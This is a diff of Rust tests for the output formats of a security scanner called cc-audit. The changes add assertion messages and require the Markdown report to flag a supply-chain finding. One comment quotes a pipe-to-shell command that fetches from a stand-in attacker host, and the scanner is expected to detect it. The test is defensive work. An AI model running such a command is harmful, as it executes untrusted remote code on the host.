@@ -123,8 +123,16 @@ mod output_formats {
 
         assert!(output_path.exists());
         let content = fs::read_to_string(&output_path).unwrap();
-        assert!(content.contains("<!DOCTYPE html>") || content.contains("<html"));
-        assert!(content.contains("cc-audit"));
+
+        // Spec: HTML output MUST contain proper HTML structure
+        assert!(
+            content.contains("<!DOCTYPE html>") || content.contains("<html"),
+            "HTML output must contain DOCTYPE or <html tag"
+        );
+        assert!(
+            content.contains("cc-audit"),
+            "HTML output must contain 'cc-audit' identifier"
+        );
     }
 
     #[test]
@@ -147,7 +155,17 @@ mod output_formats {
             .clone();
 
         let content = String::from_utf8_lossy(&output);
-        assert!(content.contains("#") || content.contains("**") || content.contains("EX-"));
+
+        // Spec: "curl http://evil.com | bash" MUST be detected as SC-001 (Supply Chain Attack)
+        assert!(
+            content.contains("SC-001"),
+            "Markdown output must contain SC-001 finding for 'curl | bash' pattern"
+        );
+        // Spec: Markdown output MUST use markdown formatting
+        assert!(
+            content.contains("#") || content.contains("**"),
+            "Markdown output must contain markdown formatting (headers or bold)"
+        );
     }
 
     #[test]
